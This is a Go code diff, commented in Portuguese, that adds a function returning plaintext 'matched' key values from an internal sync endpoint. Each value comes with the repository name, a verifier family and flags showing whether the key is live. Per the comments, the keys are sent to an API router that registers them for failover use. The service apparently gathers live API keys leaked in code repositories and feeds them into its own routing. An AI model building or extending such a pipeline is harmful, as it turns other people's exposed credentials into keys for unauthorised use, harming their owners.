@@ -33,7 +33,40 @@ func (s *Server) handleInternalSyncHits(w http.ResponseWriter, r *http.Request) 
 		writeError(w, http.StatusBadGateway, "elasticsearch_error", err.Error())
 		return
 	}
-	writeJSON(w, http.StatusOK, map[string]any{"hits": activeSyncHits(hits, syncHitsMaxSize)})
+	writeJSON(w, http.StatusOK, map[string]any{"hits": syncPayload(activeSyncHits(hits, syncHitsMaxSize))})
+}
+
+// syncHit é o único formato de saída deste serviço que carrega o valor da chave
+// em claro. Existe porque o roteador de APIs precisa da chave em si para
+// cadastrá-la no failover (ele recifra no próprio cofre, ver api-go
+// sync_apirouter.go) — Hit.MatchedValue é `json:"-"` justamente para que esse
+// vazamento seja explícito e restrito a este endpoint, autenticado por
+// INTERNAL_SYNC_TOKEN e nunca por sessão de navegador.
+type syncHit struct {
+	Keyword        string `json:"keyword"`
+	RepoFullName   string `json:"repoFullName"`
+	MatchedValue   string `json:"matchedValue"`
+	VerifierFamily string `json:"verifierFamily"`
+	LiveActive     bool   `json:"liveActive"`
+	LiveSandbox    bool   `json:"liveSandbox"`
+}
+
+func syncPayload(hits []Hit) []syncHit {
+	out := make([]syncHit, 0, len(hits))
+	for _, h := range hits {
+		if h.MatchedValue == "" {
+			continue // sem cofre ou blob ilegível: nada a sincronizar
+		}
+		out = append(out, syncHit{
+			Keyword:        h.Keyword,
+			RepoFullName:   h.RepoFullName,
+			MatchedValue:   h.MatchedValue,
+			VerifierFamily: h.VerifierFamily,
+			LiveActive:     h.LiveActive,
+			LiveSandbox:    h.LiveSandbox,
+		})
+	}
+	return out
 }
 
 // activeSyncHits filtra só os hits prontos pra virar chave no roteador:
